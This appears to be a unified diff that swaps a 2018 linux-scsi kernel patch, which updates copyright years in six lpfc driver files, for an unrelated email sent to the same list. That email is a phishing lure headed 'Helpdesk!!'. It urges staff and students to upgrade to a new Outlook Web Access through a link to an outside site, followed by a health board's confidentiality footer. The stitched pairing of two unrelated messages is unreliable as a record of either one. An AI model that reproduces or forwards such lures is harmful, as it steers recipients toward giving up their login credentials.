@@ -1,119 +1,39 @@
-From: James Smart <jsmart2021@gmail.com>
-Subject: [PATCH v4 13/13] lpfc: Change Copyright of 12.0.0.0 modified files to 2018
-Date: Fri, 16 Feb 2018 09:28:27 -0800
-Message-ID: <20180216172827.3739-14-jsmart2021@gmail.com>
-References: <20180216172827.3739-1-jsmart2021@gmail.com>
+From: Tomoko Yamaguchi <Tomoko.Yamaguchi@midcentraldhb.govt.nz>
+Subject: RE: Helpdesk!!
+Date: Fri, 16 Feb 2018 17:56:36 +0000
+Message-ID: <063CFB55BF57B5479F2DA231BDD191C740121494@PN-EXCH23.midcentral.co.nz>
+References: <063CFB55BF57B5479F2DA231BDD191C740120553@PN-EXCH23.midcentral.co.nz>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: 8bit
+Content-Type: text/plain; charset="iso-8859-1"
+Content-Transfer-Encoding: 8BIT
 Return-path: <linux-scsi-owner@vger.kernel.org>
-Received: from mail-pl0-f67.google.com ([209.85.160.67]:36388 "EHLO
-        mail-pl0-f67.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1032492AbeBPRd5 (ORCPT
-        <rfc822;linux-scsi@vger.kernel.org>); Fri, 16 Feb 2018 12:33:57 -0500
-Received: by mail-pl0-f67.google.com with SMTP id v3so2037110plg.3
-        for <linux-scsi@vger.kernel.org>; Fri, 16 Feb 2018 09:33:57 -0800 (PST)
-In-Reply-To: <20180216172827.3739-1-jsmart2021@gmail.com>
+Received: from firewall.midcentral.co.nz ([203.114.162.129]:5544 "EHLO
+        smtp.midcentraldhb.govt.nz" rhost-flags-OK-OK-OK-FAIL)
+        by vger.kernel.org with ESMTP id S1755743AbeBPSRe (ORCPT
+        <rfc822;linux-scsi@vger.kernel.org>);
+        Fri, 16 Feb 2018 13:17:34 -0500
+In-Reply-To: <063CFB55BF57B5479F2DA231BDD191C740120553@PN-EXCH23.midcentral.co.nz>
+Content-Language: en-NZ
 Sender: linux-scsi-owner@vger.kernel.org
 List-Id: linux-scsi@vger.kernel.org
-To: linux-scsi@vger.kernel.org
-Cc: James Smart <jsmart2021@gmail.com>, Dick Kennedy <dick.kennedy@broadcom.com>, James Smart <james.smart@broadcom.com>
+To: Tomoko Yamaguchi <Tomoko.Yamaguchi@midcentraldhb.govt.nz>
 
-Updated Copyright in files updated as part of 12.0.0.0
 
-Signed-off-by: Dick Kennedy <dick.kennedy@broadcom.com>
-Signed-off-by: James Smart <james.smart@broadcom.com>
-Reviewed-by: Johannes Thumshirn <jthumshirn@suse.de>
+________________________________
+From: Tomoko Yamaguchi
+Sent: Saturday, 17 February 2018 6:35 a.m.
+To: tomokotomoko.yamaguchi@midcentraldhb.govt.nz
+Subject: Helpdesk!!
 
----
-v3:
-  patch title
----
- drivers/scsi/lpfc/lpfc_bsg.c     | 2 +-
- drivers/scsi/lpfc/lpfc_ct.c      | 2 +-
- drivers/scsi/lpfc/lpfc_debugfs.c | 2 +-
- drivers/scsi/lpfc/lpfc_debugfs.h | 2 +-
- drivers/scsi/lpfc/lpfc_hw.h      | 2 +-
- drivers/scsi/lpfc/lpfc_ids.h     | 2 +-
- 6 files changed, 6 insertions(+), 6 deletions(-)
+ATTENTION!
+staffs and Student are to migrate to the new Outlook Web Access for 2018.Click on Helpdesk<http://www.update2018.flazio.com/home?r=101821> for upgrade.
 
-diff --git a/drivers/scsi/lpfc/lpfc_bsg.c b/drivers/scsi/lpfc/lpfc_bsg.c
-index 8b33b652226b..0f174ca80f67 100644
---- a/drivers/scsi/lpfc/lpfc_bsg.c
-+++ b/drivers/scsi/lpfc/lpfc_bsg.c
-@@ -1,7 +1,7 @@
- /*******************************************************************
-  * This file is part of the Emulex Linux Device Driver for         *
-  * Fibre Channel Host Bus Adapters.                                *
-- * Copyright (C) 2017 Broadcom. All Rights Reserved. The term      *
-+ * Copyright (C) 2017-2018 Broadcom. All Rights Reserved. The term *
-  * “Broadcom” refers to Broadcom Limited and/or its subsidiaries.  *
-  * Copyright (C) 2009-2015 Emulex.  All rights reserved.           *
-  * EMULEX and SLI are trademarks of Emulex.                        *
-diff --git a/drivers/scsi/lpfc/lpfc_ct.c b/drivers/scsi/lpfc/lpfc_ct.c
-index 03a7e13a049d..ebe8ac1b88e7 100644
---- a/drivers/scsi/lpfc/lpfc_ct.c
-+++ b/drivers/scsi/lpfc/lpfc_ct.c
-@@ -1,7 +1,7 @@
- /*******************************************************************
-  * This file is part of the Emulex Linux Device Driver for         *
-  * Fibre Channel Host Bus Adapters.                                *
-- * Copyright (C) 2017 Broadcom. All Rights Reserved. The term      *
-+ * Copyright (C) 2017-2018 Broadcom. All Rights Reserved. The term *
-  * “Broadcom” refers to Broadcom Limited and/or its subsidiaries.  *
-  * Copyright (C) 2004-2016 Emulex.  All rights reserved.           *
-  * EMULEX and SLI are trademarks of Emulex.                        *
-diff --git a/drivers/scsi/lpfc/lpfc_debugfs.c b/drivers/scsi/lpfc/lpfc_debugfs.c
-index 308303d501cf..fb0dc2aeed91 100644
---- a/drivers/scsi/lpfc/lpfc_debugfs.c
-+++ b/drivers/scsi/lpfc/lpfc_debugfs.c
-@@ -1,7 +1,7 @@
- /*******************************************************************
-  * This file is part of the Emulex Linux Device Driver for         *
-  * Fibre Channel Host Bus Adapters.                                *
-- * Copyright (C) 2017 Broadcom. All Rights Reserved. The term      *
-+ * Copyright (C) 2017-2018 Broadcom. All Rights Reserved. The term *
-  * “Broadcom” refers to Broadcom Limited and/or its subsidiaries.  *
-  * Copyright (C) 2007-2015 Emulex.  All rights reserved.           *
-  * EMULEX and SLI are trademarks of Emulex.                        *
-diff --git a/drivers/scsi/lpfc/lpfc_debugfs.h b/drivers/scsi/lpfc/lpfc_debugfs.h
-index 12fbf498a7ce..f32eaeb2225a 100644
---- a/drivers/scsi/lpfc/lpfc_debugfs.h
-+++ b/drivers/scsi/lpfc/lpfc_debugfs.h
-@@ -1,7 +1,7 @@
- /*******************************************************************
-  * This file is part of the Emulex Linux Device Driver for         *
-  * Fibre Channel Host Bus Adapters.                                *
-- * Copyright (C) 2017 Broadcom. All Rights Reserved. The term      *
-+ * Copyright (C) 2017-2018 Broadcom. All Rights Reserved. The term *
-  * “Broadcom” refers to Broadcom Limited and/or its subsidiaries.  *
-  * Copyright (C) 2007-2011 Emulex.  All rights reserved.           *
-  * EMULEX and SLI are trademarks of Emulex.                        *
-diff --git a/drivers/scsi/lpfc/lpfc_hw.h b/drivers/scsi/lpfc/lpfc_hw.h
-index cf83322cd4fe..08a3f1520159 100644
---- a/drivers/scsi/lpfc/lpfc_hw.h
-+++ b/drivers/scsi/lpfc/lpfc_hw.h
-@@ -1,7 +1,7 @@
- /*******************************************************************
-  * This file is part of the Emulex Linux Device Driver for         *
-  * Fibre Channel Host Bus Adapters.                                *
-- * Copyright (C) 2017 Broadcom. All Rights Reserved. The term      *
-+ * Copyright (C) 2017-2018 Broadcom. All Rights Reserved. The term *
-  * “Broadcom” refers to Broadcom Limited and/or its subsidiaries.  *
-  * Copyright (C) 2004-2016 Emulex.  All rights reserved.           *
-  * EMULEX and SLI are trademarks of Emulex.                        *
-diff --git a/drivers/scsi/lpfc/lpfc_ids.h b/drivers/scsi/lpfc/lpfc_ids.h
-index 329c8d28869c..07ee34017d88 100644
---- a/drivers/scsi/lpfc/lpfc_ids.h
-+++ b/drivers/scsi/lpfc/lpfc_ids.h
-@@ -1,7 +1,7 @@
- /*******************************************************************
-  * This file is part of the Emulex Linux Device Driver for         *
-  * Fibre Channel Host Bus Adapters.                                *
-- * Copyright (C) 2017 Broadcom. All Rights Reserved. The term      *
-+ * Copyright (C) 2017-2018 Broadcom. All Rights Reserved. The term *
-  * “Broadcom” refers to Broadcom Limited and/or its subsidiaries.  *
-  * Copyright (C) 2004-2016 Emulex.  All rights reserved.           *
-  * EMULEX and SLI are trademarks of Emulex.                        *
--- 
-2.13.1
+################################################################################
+Attention: 
+This e-mail message and any attachments contain information that is confidential and may be subject to Legal and Medical privilege. 
+If you are not the intended recipient, you must not peruse, use, pass on or copy this message or any attachments. 
+If you have received this e-mail in error, please notify us by return e-mail and erase all copies of this message including any attachments.
+MidCentral District Health Board does not accept any liability in respect of any virus which is not detected.
+
+This e-mail message has been scanned and cleared by MailMarshal
+################################################################################
